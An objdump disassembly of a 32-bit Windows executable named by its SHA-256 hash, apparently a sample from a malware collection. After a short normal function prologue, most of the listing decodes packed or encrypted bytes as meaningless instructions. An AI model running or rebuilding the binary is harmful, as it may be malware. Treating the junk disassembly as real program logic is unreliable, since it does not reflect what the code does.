
6f2b29af08532f78c3f0b2608e8924c01adeb09bd1dfe0553928193b5678a320.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	push   ebx
  401007:	mov    DWORD PTR [ebp-0x48],0x0
  40100e:	mov    DWORD PTR [ebp-0x18],0x0
  401015:	mov    DWORD PTR [ebp-0x70],0x0
  40101c:	mov    DWORD PTR [ebp-0x60],0x0
  401023:	mov    DWORD PTR [ebp-0x8],0x0
  40102a:	mov    DWORD PTR [ebp-0x6c],0x0
  401031:	mov    DWORD PTR [ebp-0x68],0x0
  401038:	mov    DWORD PTR [ebp-0x14],0x0
  40103f:	mov    DWORD PTR [ebp-0x4c],0x0
  401046:	mov    DWORD PTR [ebp-0x10],0x0
  40104d:	mov    DWORD PTR [ebp-0x58],0x0
  401054:	mov    DWORD PTR [ebp-0x4],0x0
  40105b:	mov    DWORD PTR [ebp-0x5c],0x0
  401062:	mov    DWORD PTR [ebp-0x30],0x0
  401069:	mov    DWORD PTR [ebp-0x54],0x0
  401070:	mov    DWORD PTR [ebp-0x2c],0x0
  401077:	mov    DWORD PTR [ebp-0x50],0x0
  40107e:	mov    DWORD PTR [ebp-0xc],0x0
  401085:	mov    eax,ds:0x449e08
  40108a:	mov    DWORD PTR [ebp-0x28],eax
  40108d:	mov    ecx,DWORD PTR ds:0x449e0c
  401093:	mov    DWORD PTR [ebp-0x24],ecx
  401096:	mov    edx,DWORD PTR ds:0x449e10
  40109c:	mov    DWORD PTR [ebp-0x20],edx
  40109f:	mov    al,ds:0x449e14
  4010a4:	mov    BYTE PTR [ebp-0x1c],al
  4010a7:	mov    ecx,DWORD PTR ds:0x449e18
  4010ad:	mov    DWORD PTR [ebp-0x40],ecx
  4010b0:	mov    edx,DWORD PTR ds:0x449e1c
  4010b6:	mov    DWORD PTR [ebp-0x3c],edx
  4010b9:	mov    eax,ds:0x449e20
  4010be:	mov    DWORD PTR [ebp-0x38],eax
  4010c1:	mov    cx,WORD PTR ds:0x449e24
  4010c8:	mov    WORD PTR [ebp-0x34],cx
  4010cc:	mov    dl,BYTE PTR ds:0x449e26
  4010d2:	mov    BYTE PTR [ebp-0x32],dl
  4010d5:	mov    DWORD PTR [ebp-0x30],0x40
  4010dc:	lea    eax,[ebp-0x40]
  4010df:	push   eax
  4010e0:	lea    ecx,[ebp-0x10]
  4010e3:	push   ecx
  4010e4:	call   DWORD PTR ds:0x418000
  4010ea:	test   eax,eax
  4010ec:	je     0x4167b5
  4010f2:	mov    edx,DWORD PTR [ebp-0x10]
  4010f5:	add    edx,0x1
  4010f8:	mov    DWORD PTR [ebp-0x10],edx
  4010fb:	inc    edi
  4010fc:	pop    esi
  4010fd:	xchg   ebx,eax
  4010fe:	fiadd  DWORD PTR [esi-0x65]
  401101:	scas   eax,DWORD PTR es:[edi]
  401102:	pop    edx
  401103:	xor    DWORD PTR [ebx-0x9],esp
  401106:	ja     0x401132
  401108:	sar    dl,cl
  40110a:	jle    0x4010ff
  40110c:	or     bh,al
  40110e:	fild   WORD PTR [ecx+eiz*4]
  401111:	mov    ds:0xf1284324,eax
  401116:	stos   BYTE PTR es:[edi],al
  401117:	ret    0xa1ed
  40111a:	rol    BYTE PTR [esi-0x5b],0x39
  40111e:	(bad)  
  40111f:	cmp    DWORD PTR [edx],0xb2785c28
  401125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401126:	je     0x401187
  401128:	hlt    
  401129:	push   0xd01c2c1f
  40112e:	add    edi,eax
  401130:	dec    edi
  401131:	aas    
  401132:	mov    ch,BYTE PTR [edi-0x5fe8c6a5]
  401138:	mov    dh,0xfe
  40113a:	jbe    0x4011a2
  40113c:	pop    edx
  40113d:	adc    DWORD PTR [ebx+0x6a0734dd],ebp
  401143:	push   cs
  401144:	jl     0x4010e9
  401146:	pop    eax
  401147:	sbb    ecx,DWORD PTR [ebp+0x1f]
  40114a:	jo     0x401197
  40114c:	int3   
  40114d:	jns    0x401112
  40114f:	jge    0x401177
  401151:	jnp    0x4010e7
  401153:	gs jge 0x40116e
  401156:	adc    al,0x8c
  401158:	loope  0x4011d7
  40115a:	mov    al,ds:0x76bafe7e
  40115f:	jl     0x4011d5
  401161:	stos   DWORD PTR es:[edi],eax
  401162:	sub    eax,DWORD PTR [edi]
  401164:	sbb    BYTE PTR [ebp-0x37],0x2
  401168:	(bad)  
  40116a:	ins    DWORD PTR es:[edi],dx
  40116b:	in     eax,0x57
  40116d:	add    esp,DWORD PTR [edx+0x74]
  401170:	out    0x32,eax
  401172:	push   ds
  401173:	imul   edi,edi,0x70
  401176:	into   
  401177:	sbb    eax,0x9669be20
  40117c:	stos   DWORD PTR es:[edi],eax
  40117d:	mov    ds:0x9eb57bfe,eax
  401182:	mov    edi,0x44b5b400
  401187:	jnp    0x4011ab
  401189:	fwait
  40118a:	inc    edi
  40118b:	sbb    BYTE PTR [ecx-0x5b],cl
  40118e:	xchg   BYTE PTR [ecx+0x4b],cl
  401191:	mov    ecx,0x7232472b
  401196:	cmp    eax,0x36f0aac0
  40119b:	rol    bl,0xd0
  40119e:	daa    
  40119f:	in     eax,dx
  4011a0:	sbb    BYTE PTR [eax-0x677e19bb],dl
  4011a6:	retf   
  4011a7:	into   
  4011a8:	mov    esp,0x50ea19a8
  4011ad:	and    eax,0xa7e9c55c
  4011b2:	xchg   esi,eax
  4011b3:	or     eax,0x1695232e
  4011b8:	test   al,0xf1
  4011ba:	inc    ecx
  4011bb:	fadd   DWORD PTR [eax-0x6d663ee1]
  4011c1:	adc    DWORD PTR [ecx+edi*4],eax
  4011c4:	int    0x30
  4011c6:	xchg   ebp,eax
  4011c7:	fsub   DWORD PTR [ebp+0x1e]
  4011ca:	aas    
  4011cb:	cwde   
  4011cc:	shl    esp,0x59
  4011cf:	fidiv  WORD PTR [ebx+0x27a35541]
  4011d5:	mov    bl,0xad
  4011d7:	push   cs
  4011d8:	arpl   WORD PTR [ebp-0x41fb91f3],bx
  4011de:	and    esp,ebx
  4011e0:	(bad)  
  4011e1:	div    DWORD PTR [ebp-0x60cc89ee]
  4011e7:	or     esp,DWORD PTR [ecx+0x21]
  4011ea:	cdq    
  4011eb:	mov    edi,0x8f140d35
  4011f0:	std    
  4011f1:	xor    DWORD PTR [ecx-0x4456c409],ecx
  4011f7:	or     dh,bl
  4011f9:	es inc edx
  4011fb:	(bad)  
  4011fc:	jmp    0xc46d0915
  401201:	inc    ecx
  401202:	das    
  401203:	mov    al,0x17
  401205:	(bad)
  401209:	mov    ah,0x54
  40120b:	sbb    ah,ch
  40120d:	push   esi
  40120e:	out    dx,eax
  40120f:	les    esp,FWORD PTR [ebp+0x20]
  401212:	mov    bh,0x8b
  401214:	xchg   edi,eax
  401215:	sti    
  401216:	je     0x4011e7
  401218:	push   esp
  401219:	ins    BYTE PTR es:[edi],dx
  40121a:	inc    ebx
  40121b:	les    esp,FWORD PTR [ecx]
  40121d:	dec    esp
  40121e:	call   0xf129:0x9e297c0c
  401225:	xor    dl,BYTE PTR [eax+0x75360666]
  40122b:	push   0x3e994ca3
  401230:	pop    edx
  401231:	push   esi
  401232:	mov    cs,esi
  401234:	aad    0x60
  401236:	pop    ebp
  401237:	fwait
  401238:	push   esi
  401239:	aam    0x7
  40123b:	in     al,dx
  40123c:	fstp   TBYTE PTR [esi]
  40123e:	mov    es,WORD PTR ss:[ebx+0x37e231b1]
  401245:	mov    WORD PTR [ecx+0x1c],gs
  401248:	(bad)  
  401249:	in     al,0x82
  40124b:	xor    BYTE PTR [edx-0x33],al
  40124e:	leavew 
  401250:	sbb    al,0x34
  401252:	push   edx
  401253:	inc    ebx
  401254:	inc    edx
  401255:	jmp    0x40128d
  401257:	loop   0x4012b4
  401259:	pop    ecx
  40125a:	inc    esp
  40125b:	(bad)  
  40125c:	xlat   BYTE PTR ds:[ebx]
  40125d:	imul   ebp,DWORD PTR [edi],0xffffffb3
  401260:	lds    edi,FWORD PTR [eax]
  401262:	jnp    0x40126b
  401264:	add    DWORD PTR [ebp-0x56],ecx
  401267:	scas   eax,DWORD PTR es:[edi]
  401268:	xor    DWORD PTR [esi-0x5c42caee],esi
  40126e:	mov    dh,0x17
  401270:	int    0x69
  401272:	inc    esp
  401273:	pop    ebp
  401274:	push   ds
  401275:	pop    esi
  401276:	fisttp QWORD PTR [esi]
  401278:	stos   BYTE PTR es:[edi],al
  401279:	push   es
  40127a:	cmp    dl,BYTE PTR [eax+0x6361fbb7]
  401280:	push   edx
  401281:	shr    DWORD PTR [ebx],1
  401283:	call   0x975e77f4
  401288:	mov    al,ds:0xa42b33f4
  40128d:	or     al,0xe0
  40128f:	mov    ds:0x11bfd015,al
  401294:	out    0xaa,eax
  401296:	jb     0x40122c
  401298:	call   0xc2af:0xa7bec726
  40129f:	rcl    DWORD PTR [ecx-0x7b3b5993],cl
  4012a5:	out    dx,al
  4012a6:	and    dl,BYTE PTR [edi]
  4012a8:	nop
  4012a9:	inc    esi
  4012aa:	push   ecx
  4012ab:	push   0xffffff99
  4012ad:	mov    al,ds:0x4512cb3b
  4012b2:	(bad)  ds:0x72479a09
  4012b8:	lods   eax,DWORD PTR ds:[esi]
  4012b9:	push   esi
  4012ba:	adc    al,BYTE PTR [esi-0x6df95b5b]
  4012c0:	nop
  4012c1:	aam    0xfa
  4012c3:	push   ss
  4012c4:	push   0x44
  4012c6:	xor    eax,0x26c6bc0b
  4012cb:	inc    edi
  4012cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012cd:	sub    eax,0x7470b6bb
  4012d2:	xchg   esi,eax
  4012d3:	mov    bl,0xb2
  4012d5:	jmp    0x401277
  4012d7:	xlat   BYTE PTR ds:[ebx]
  4012d8:	push   esi
  4012d9:	mov    ds:0xbe8143a3,eax
  4012de:	sti    
  4012df:	mov    edx,0x563e8abc
  4012e4:	out    dx,al
  4012e5:	dec    esp
  4012e6:	mov    ds,edi
  4012e8:	push   ebx
  4012e9:	mov    ebp,0xf0d27f30
  4012ee:	adc    eax,0x983af5a8
  4012f3:	fwait
  4012f4:	dec    ebx
  4012f5:	or     eax,0xd44cb67b
  4012fa:	xor    eax,DWORD PTR [edi]
  4012fc:	cmp    al,0x3e
  4012fe:	aas    
  4012ff:	adc    cl,BYTE PTR [ebx+edx*8+0x58]
  401303:	pop    ebx
  401304:	cwde   
  401305:	or     ch,BYTE PTR [edi+0x5b]
  401308:	mov    cl,0x81
  40130a:	mov    ah,0x3a
  40130c:	sahf   
  40130d:	xor    eax,0xeaa56722
  401312:	arpl   WORD PTR [edx-0xa71031e],ax
  401318:	stos   BYTE PTR es:[edi],al
  401319:	out    0xfa,eax
  40131b:	and    BYTE PTR [edi+edi*2-0x21],ah
  40131f:	inc    edx
  401320:	int3   
  401321:	imul   edi,DWORD PTR [esi+0x756b7886],0xbe91a3c0
  40132b:	jle    0x401363
  40132d:	(bad)  
  40132f:	mov    fs,WORD PTR [edi+ecx*2]
  401332:	loop   0x401364
  401334:	ror    edi,cl
  401336:	inc    edx
  401337:	pop    es
  401338:	shl    BYTE PTR [edx],cl
  40133a:	sub    ebp,esi
  40133c:	sbb    ebx,DWORD PTR [ebx+0xdafc21b]
  401342:	(bad)  
  401343:	fild   QWORD PTR [ebp+0x1d]
  401346:	dec    esp
  401347:	mov    ch,0xc4
  401349:	cdq    
  40134a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40134b:	xlat   BYTE PTR ds:[ebx]
  40134c:	adc    eax,0x232b6064
  401351:	mov    dl,dh
  401353:	pop    edi
  401354:	imul   ebp,DWORD PTR [ecx+0x2beb6c73],0xc1e34dbc
  40135e:	call   0xba78e6fa
  401363:	jns    0x4013b1
  401365:	xchg   DWORD PTR [ecx],ebp
  401367:	jge    0x401322
  401369:	sbb    al,0x4d
  40136b:	xor    ebp,DWORD PTR [eiz*2-0x12812fa2]
  401372:	out    dx,al
  401373:	add    eax,0x54aa664
  401378:	mov    ah,0x6c
  40137a:	imul   ecx,DWORD PTR [edx+0x1a],0xffffffd4
  40137e:	add    dl,BYTE PTR [ecx+eax*4+0x60]
  401382:	inc    ebp
  401383:	push   0x1c
  401385:	test   DWORD PTR [ebx],esi
  401387:	or     DWORD PTR [ecx+esi*4+0x6237c03b],0x31041786
  401392:	jo     0x4013df
  401394:	xchg   esi,eax
  401395:	cmp    al,dl
  401397:	jmp    0x2986:0x47288b03
  40139e:	enter  0x7257,0x69
  4013a2:	rol    BYTE PTR [esi+eax*4-0x37],1
  4013a6:	mov    ds:0x5a07eafd,al
  4013ab:	and    al,0xf4
  4013ad:	(bad)  
  4013ae:	dec    eax
  4013af:	mov    eax,0xdaf19dc1
  4013b4:	inc    edx
  4013b5:	xchg   edx,eax
  4013b6:	xor    DWORD PTR [ecx-0x47],ebp
  4013b9:	shl    BYTE PTR [edx],1
  4013bb:	popf   
  4013bc:	lods   eax,DWORD PTR ds:[esi]
  4013bd:	and    esp,ebp
  4013bf:	repz inc ebx
  4013c1:	mov    WORD PTR [edx-0x3],?
  4013c4:	jns    0x40140f
  4013c6:	in     al,0x6b
  4013c8:	ja     0x4013c7
  4013ca:	in     al,dx
  4013cb:	lds    ebp,FWORD PTR [esp+esi*2-0x3811924]
  4013d2:	dec    ecx
  4013d3:	nop
  4013d4:	and    al,0x47
  4013d6:	lods   al,BYTE PTR ds:[esi]
  4013d7:	sub    al,0xcb
  4013d9:	push   edx
  4013da:	lock mov edi,0xdf438099
  4013e0:	dec    ebp
  4013e1:	enter  0x27f7,0x4c
  4013e5:	inc    ebx
  4013e6:	push   esp
  4013e7:	loope  0x4013b3
  4013e9:	dec    esi
  4013ea:	outs   dx,DWORD PTR ds:[esi]
  4013eb:	in     al,dx
  4013ec:	dec    eax
  4013ed:	xlat   BYTE PTR ds:[ebx]
  4013ee:	mov    ah,0x5d
  4013f0:	sbb    BYTE PTR ds:0x162ed3c,dh
  4013f6:	jb     0x401436
  4013f8:	(bad)  
  4013f9:	(bad)  [ebp+0x6ce79b72]
  4013ff:	out    0x8f,al
  401401:	mov    edi,0x915d75dd
  401406:	push   ds
  401407:	push   es
  401408:	xchg   cl,dl
  40140a:	cdq    
  40140b:	cmp    esp,edi
  40140d:	mov    esp,0x78c0645c
  401412:	imul   eax,DWORD PTR [edx],0xffffff8f
  401415:	adc    DWORD PTR [ebp-0x5e],edi
  401418:	xchg   esi,eax
  401419:	and    bl,dh
  40141b:	push   esp
  40141c:	sub    DWORD PTR [ebx],ecx
  40141e:	mov    BYTE PTR [edi-0x6c],dl
  401421:	or     eax,0x8da942f3
  401426:	test   DWORD PTR [ebx+ebx*4],ebx
  401429:	push   esi
  40142a:	jmp    0x6db8d212
  40142f:	jb     0x401495
  401431:	dec    ecx
  401432:	xor    esp,DWORD PTR [eax+0x41]
  401435:	daa    
  401436:	xchg   DWORD PTR [edi+0x396d2bf3],edi
  40143c:	dec    edi
  40143d:	int3   
  40143e:	push   ds
  40143f:	sahf   
  401440:	push   0x7192d34c
  401445:	les    ecx,FWORD PTR [eax-0x80]
  401448:	int3   
  401449:	mov    ecx,0xb1375470
  40144e:	(bad)  
  40144f:	fcomip st,st(0)
  401451:	adc    bl,0x2f
  401454:	mov    ch,0x28
  401456:	jb     0x401410
  401458:	in     eax,dx
  401459:	in     al,0xa5
  40145b:	and    DWORD PTR [ebp+0x6bd3210],ebx
  401461:	fisubr WORD PTR [ebx*1-0x5807cfe4]
  401468:	xchg   esi,eax
  401469:	test   DWORD PTR [ebx-0x19d782dd],eax
  40146f:	test   DWORD PTR [ebx-0x2f775c5],edx
  401475:	sbb    dh,BYTE PTR [edx+edx*2+0xa]
  401479:	cmp    DWORD PTR [edx-0x7e5ae640],edi
  40147f:	aaa    
  401480:	add    eax,0x46aee9fd
  401485:	(bad)  
  401486:	push   cs
  401487:	push   0xc3e91f73
  40148c:	rcr    BYTE PTR [eax-0x23],0xcc
  401490:	sar    BYTE PTR [ebp-0x20],0xfc
  401494:	mov    esi,0x6c596a55
  401499:	jnp    0x4014f8
  40149b:	xor    al,0xc6
  40149d:	or     DWORD PTR [esi+0x45],esp
  4014a0:	pop    es
  4014a1:	jecxz  0x4014c4
  4014a3:	cld    
  4014a4:	pop    esi
  4014a5:	push   esp
  4014a6:	inc    ebx
  4014a7:	and    dl,ch
  4014a9:	mov    cl,0x2e
  4014ab:	mov    bh,0x1e
  4014ad:	sbb    ch,BYTE PTR [ebp+ebp*2-0x7b]
  4014b1:	(bad)  
  4014b2:	shr    BYTE PTR [eax+0x19],cl
  4014b5:	or     eax,0xbcf9ccc4
  4014ba:	stc    
  4014bb:	test   eax,0xf6917e0e
  4014c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014c1:	shr    DWORD PTR [eax+0x3d],1
  4014c4:	sub    BYTE PTR [edx],ah
  4014c6:	out    dx,eax
  4014c7:	int3   
  4014c8:	mov    DWORD PTR [esi],edx
  4014ca:	mov    cl,0xef
  4014cc:	xchg   ch,al
  4014ce:	cld    
  4014cf:	addr16 ja 0x401508
  4014d2:	(bad)
  4014d6:	cmp    al,0x7c
  4014d8:	pop    ebp
  4014d9:	arpl   WORD PTR [edi],sp
  4014db:	test   al,0x65
  4014dd:	inc    edi
  4014de:	in     al,0x4d
  4014e0:	add    eax,0xd79c1da6
  4014e5:	stc    
  4014e6:	call   0xd481:0x510358ba
  4014ed:	scas   eax,DWORD PTR es:[edi]
  4014ee:	loopne 0x4014f1
  4014f0:	mov    ah,0x65
  4014f2:	xor    al,0x90
  4014f4:	push   ss
  4014f5:	jns    0x40150e
  4014f7:	inc    esp
  4014f8:	lea    ebx,[edi]
  4014fa:	mov    eax,ds:0x475b875f
  4014ff:	add    ch,BYTE PTR ss:[ebp+0x4]
  401503:	fucompp 
  401505:	loope  0x4014c4
  401507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401508:	jmp    0xaf8e9c70
  40150d:	loopne 0x4014f2
  40150f:	test   eax,0xca433c5c
  401514:	stos   DWORD PTR es:[edi],eax
  401515:	mov    bh,0x5b
  401517:	push   eax
  401518:	shl    DWORD PTR [edx+0x27],0x36
  40151c:	push   ebx
  40151d:	imul   ebx,ecx,0x48
  401520:	jl     0x401594
  401522:	sbb    eax,0x79c2606f
  401527:	iret   
  401528:	outs   dx,BYTE PTR ds:[esi]
  401529:	fwait
  40152a:	out    0x88,al
  40152c:	and    dl,BYTE PTR [ebx+0x604826b6]
  401532:	add    BYTE PTR [eax],al
  401534:	fadd   st,st(2)
  401536:	xor    bl,bh
  401538:	mov    ebp,0x82011b38
  40153d:	mov    DWORD PTR [esi+edi*8],0xad295385
  401544:	popf   
  401545:	test   eax,0x8c5e5db7
  40154a:	or     bh,BYTE PTR [ebp-0x1fda272c]
  401550:	push   ebx
  401551:	loop   0x40154e
  401553:	into   
  401554:	pop    eax
  401555:	pop    ebp
  401556:	arpl   cx,si
  401558:	and    dh,BYTE PTR [esi-0x141aa1d2]
  40155e:	and    bl,dh
  401560:	retf   0x7b08
  401563:	repnz test BYTE PTR [ebx-0x2d5a2da0],al
  40156a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40156b:	sbb    eax,ebx
  40156d:	aas    
  40156e:	mov    edi,0x5b555ae
  401573:	inc    esi
  401574:	rcl    ebx,cl
  401576:	repnz lahf 
  401578:	mov    al,0xc3
  40157a:	out    dx,al
  40157b:	repnz and ecx,esi
  40157e:	sbb    al,0x16
  401580:	mov    dl,0xb
  401582:	sti    
  401583:	mov    eax,0x7287866
  401588:	es dec esi
  40158a:	imul   esp,DWORD PTR [esi],0x261834e9
  401590:	lods   al,BYTE PTR ds:[esi]
  401591:	sub    DWORD PTR [edi-0x49],edx
  401594:	das    
  401595:	cdq    
  401596:	inc    esp
  401597:	dec    ecx
  401598:	add    al,0x22
  40159a:	fsub   QWORD PTR cs:[ecx*4+0x536c8630]
  4015a2:	and    DWORD PTR [ebx+0x43],0xffffff8f
  4015a6:	shl    BYTE PTR [ecx+ecx*8],1
  4015a9:	inc    edx
  4015aa:	push   edx
  4015ab:	ret    
  4015ac:	stos   BYTE PTR es:[edi],al
  4015ad:	or     ebx,DWORD PTR [ebx]
  4015af:	push   ebp
  4015b0:	mov    dh,0xbe
  4015b2:	pop    ebp
  4015b3:	shl    BYTE PTR [esi+0x38bc9438],cl
  4015b9:	stc    
  4015ba:	imul   edi,DWORD PTR [ebx],0x54
  4015bd:	mov    eax,DWORD PTR [eax-0x68632877]
  4015c3:	xchg   ebx,eax
  4015c4:	lea    ebx,[edi-0x10d3918b]
  4015ca:	dec    esp
  4015cb:	xchg   edx,eax
  4015cc:	outs   dx,DWORD PTR ds:[esi]
  4015cd:	(bad)  
  4015ce:	loope  0x4015fa
  4015d0:	sbb    ah,BYTE PTR [esi-0x2c95eea9]
  4015d6:	aaa    
  4015d7:	jne    0x401601
  4015d9:	aam    0xd2
  4015db:	add    BYTE PTR [edx-0x766204dc],dl
  4015e1:	stos   DWORD PTR es:[edi],eax
  4015e2:	inc    ebp
  4015e3:	fwait
  4015e4:	and    dl,BYTE PTR [esp+eax*8-0x6b]
  4015e8:	test   al,0x5e
  4015ea:	pop    eax
  4015eb:	outs   dx,BYTE PTR ds:[esi]
  4015ec:	loopne 0x40156f
  4015ee:	mov    cs,WORD PTR [ebx+eax*2]
  4015f1:	dec    esp
  4015f2:	inc    ebx
  4015f3:	push   esp
  4015f4:	cwde   
  4015f5:	fs loopne 0x401617
  4015f8:	shl    BYTE PTR [ecx-0x39],0x82
  4015fc:	mov    dh,BYTE PTR [esi+ebp*4-0x10eaa75c]
  401603:	nop
  401604:	cmp    BYTE PTR [ebx+ecx*2-0x52603511],dl
  40160b:	shr    BYTE PTR [edx+0x76086588],0x27
  401612:	fisttp QWORD PTR [edx-0x2b0a52df]
  401618:	repnz xor BYTE PTR [edi],ah
  40161b:	out    dx,al
  40161c:	jbe    0x40169a
  40161e:	inc    esi
  40161f:	sti    
  401620:	xor    DWORD PTR [eax-0x6],eax
  401623:	sti    
  401624:	cmp    eax,0xa4976888
  401629:	ror    edx,cl
  40162b:	dec    esi
  40162c:	ret    
  40162d:	cmc    
  40162e:	icebp  
  40162f:	ins    BYTE PTR es:[edi],dx
  401630:	(bad)  
  401631:	cld    
  401632:	or     cl,BYTE PTR ds:0xfce79cae
  401638:	scas   eax,DWORD PTR es:[edi]
  401639:	mov    ebx,0xadad0184
  40163e:	cmp    DWORD PTR [ecx+esi*8],edi
  401641:	imul   DWORD PTR [edx]
  401643:	jbe    0x4016bb
  401645:	xor    BYTE PTR ds:0xa52a80a4,ch
  40164b:	imul   DWORD PTR [ebp-0x69]
  40164e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40164f:	or     DWORD PTR [esi+0x4f0ab6f1],0x23
  401656:	(bad)  [esi-0xc]
  401659:	pop    ebp
  40165a:	lods   eax,DWORD PTR ds:[esi]
  40165b:	mov    edx,0x6fd8ec18
  401660:	sbb    esi,DWORD PTR [edx+0x11948706]
  401666:	jns    0x4016dd
  401668:	call   DWORD PTR [ecx-0x6f]
  40166b:	jecxz  0x4015ef
  40166d:	sub    DWORD PTR [esi],0x5275cfd8
  401673:	mov    eax,0x1d13647f
  401678:	inc    edx
  401679:	test   eax,0xee7d0571
  40167e:	push   edi
  40167f:	xlat   BYTE PTR ds:[ebx]
  401680:	out    dx,eax
  401681:	aas    
  401682:	cmp    al,0x8d
  401684:	fist   DWORD PTR [ebx+eax*1+0x2e0af67b]
  40168b:	retf   
  40168c:	cli    
  40168d:	sbb    DWORD PTR [esp+eax*8],ebp
  401690:	push   esi
  401691:	adc    al,0x4e
  401693:	adc    DWORD PTR [ebx-0x61],eax
  401696:	retf   
  401697:	test   eax,0xf8133e2b
  40169c:	fdiv   DWORD PTR [ebx]
  40169e:	cdq    
  40169f:	sub    DWORD PTR [ecx+0x2d1d9c12],ecx
  4016a5:	cs mov dl,0xfb
  4016a8:	pop    ebp
  4016a9:	pop    ds
  4016aa:	daa    
  4016ab:	into   
  4016ac:	sbb    eax,0xd1d47b12
  4016b1:	jp     0x401641
  4016b3:	je     0x401670
  4016b5:	inc    esp
  4016b6:	adc    BYTE PTR [esi+0x7448390a],dl
  4016bc:	pusha  
  4016bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016be:	xchg   esi,eax
  4016bf:	nop
  4016c0:	test   BYTE PTR [esi+ebp*2],0x9c
  4016c4:	in     eax,dx
  4016c5:	add    eax,0x468418af
  4016ca:	fst    DWORD PTR [esi+0x68cd709f]
  4016d0:	sbb    BYTE PTR ds:0x1330e477,0x13
  4016d7:	xchg   esi,eax
  4016d8:	and    ch,BYTE PTR [eax-0x3f]
  4016db:	xchg   esp,eax
  4016dc:	repz sbb eax,0xfd646445
  4016e2:	cmp    al,0xc9
  4016e4:	xor    dh,dh
  4016e6:	cmp    ch,BYTE PTR [edi]
  4016e8:	fwait
  4016e9:	pop    eax
  4016ea:	loopne 0x4016b3
  4016ec:	jbe    0x4016e0
  4016ee:	fld    st(3)
  4016f0:	popa   
  4016f1:	jmp    0x58aa8286
  4016f6:	mov    edx,0x9b48b8ed
  4016fb:	and    DWORD PTR [edx],edx
  4016fd:	out    dx,al
  4016fe:	iret   
  4016ff:	push   ecx
  401700:	mov    ds:0xdc20c7c7,eax
  401705:	jo     0x4016ad
  401707:	pushf  
  401708:	ins    DWORD PTR es:[edi],dx
  401709:	inc    ecx
  40170a:	bound  eax,QWORD PTR [edi+0x61]
  40170d:	dec    esi
  40170e:	(bad)  
  40170f:	out    dx,eax
  401710:	(bad)  
  401711:	pop    ds
  401712:	xchg   BYTE PTR [ecx],cl
  401714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401715:	lods   eax,DWORD PTR ds:[esi]
  401716:	out    0x95,eax
  401718:	inc    ebx
  401719:	imul   ebp,DWORD PTR [ebx+0x6a14abc6],0x12
  401720:	inc    esi
  401721:	mov    al,0x62
  401723:	mov    ch,0xb1
  401725:	scas   al,BYTE PTR es:[edi]
  401726:	and    dh,BYTE PTR [edx-0x2b22cf2b]
  40172c:	mov    eax,ds:0x3152e945
  401731:	dec    esp
  401732:	jg     0x401772
  401734:	mov    ecx,0x48dfda91
  401739:	sub    BYTE PTR [ebx-0xb408728],ch
  40173f:	mov    DWORD PTR [edx+0xe],eax
  401742:	sbb    al,0xfa
  401744:	jae    0x4016e2
  401746:	mov    DWORD PTR [ecx],edx
  401748:	and    DWORD PTR [edx+0x341697c0],edx
  40174e:	fsubr  QWORD PTR [ebx]
  401750:	push   cs
  401751:	lods   al,BYTE PTR ds:[esi]
  401752:	push   esp
  401753:	mov    ch,ah
  401755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401756:	hlt    
  401757:	ja     0x401750
  401759:	sbb    eax,DWORD PTR fs:[esi-0x5964d54a]
  401760:	mov    bh,0x35
  401762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401763:	iret   
  401764:	dec    esp
  401765:	inc    esi
  401766:	fcmovne st,st(5)
  401768:	les    edi,FWORD PTR ds:0x8ffe6ca
  40176e:	mov    ch,0xa9
  401770:	ja     0x40178a
  401772:	call   0x89f4:0x88a03d95
  401779:	mov    fs,edx
  40177b:	and    DWORD PTR [esi+0x52],ebp
  40177e:	xlat   BYTE PTR ds:[ebx]
  40177f:	fst    QWORD PTR [ecx-0x625bb64f]
  401785:	scas   eax,DWORD PTR es:[edi]
  401786:	test   DWORD PTR [eax],esi
  401788:	dec    esi
  401789:	inc    esi
  40178a:	or     bh,bl
  40178c:	dec    esi
  40178d:	test   BYTE PTR [edi-0x540169b2],0x5d
  401794:	ret    0x9dd4
  401797:	mov    eax,ds:0x8c97fb81
  40179c:	push   cs
  40179d:	cmp    eax,0xd45a962d
  4017a2:	add    ebx,DWORD PTR [ecx-0x1430aea2]
  4017a8:	in     al,dx
  4017a9:	xor    ah,BYTE PTR ds:[ecx]
  4017ac:	data16 cmp al,0xe5
  4017af:	xchg   edi,eax
  4017b0:	jnp    0x401807
  4017b2:	cmp    esi,edi
  4017b4:	bound  edi,QWORD PTR [esi+edx*1-0x53]
  4017b8:	xchg   esi,eax
  4017b9:	scas   al,BYTE PTR es:[edi]
  4017ba:	in     al,0xba
  4017bc:	jg     0x401832
  4017be:	jb     0x4017da
  4017c0:	mov    WORD PTR [edi+0x376458fd],fs
  4017c6:	js     0x4017dd
  4017c8:	repz push 0xb
  4017cb:	push   cs
  4017cc:	loop   0x40177d
  4017ce:	xchg   ch,bh
  4017d0:	jle    0x4017b7
  4017d2:	jb     0x4017b7
  4017d4:	fild   QWORD PTR [ecx]
  4017d6:	(bad)  
  4017d7:	daa    
  4017d8:	mov    ebp,fs
  4017da:	push   eax
  4017db:	inc    eax
  4017dc:	sbb    bl,BYTE PTR [ebx-0x6ca84963]
  4017e2:	into   
  4017e3:	cmp    ah,dh
  4017e5:	call   0xb4fb4e3c
  4017ea:	ja     0x40178a
  4017ec:	add    DWORD PTR [edx-0x40],ebx
  4017ef:	dec    esi
  4017f0:	rep outs dx,BYTE PTR ds:[esi]
  4017f2:	jnp    0x401816
  4017f4:	neg    BYTE PTR [esi-0x3b]
  4017f7:	ror    DWORD PTR [edx],1
  4017f9:	gs push cs
  4017fb:	dec    edi
  4017fc:	push   cs
  4017fd:	(bad)  
  4017fe:	ds aam 0xf0
  401801:	loopne 0x40179c
  401803:	inc    edi
  401804:	xor    dh,BYTE PTR [ebp+0x73]
  401807:	sahf   
  401808:	out    dx,al
  401809:	in     al,0x31
  40180b:	pop    es
  40180c:	retf   0x98e
  40180f:	aaa    
  401810:	push   0x19
  401812:	pop    eax
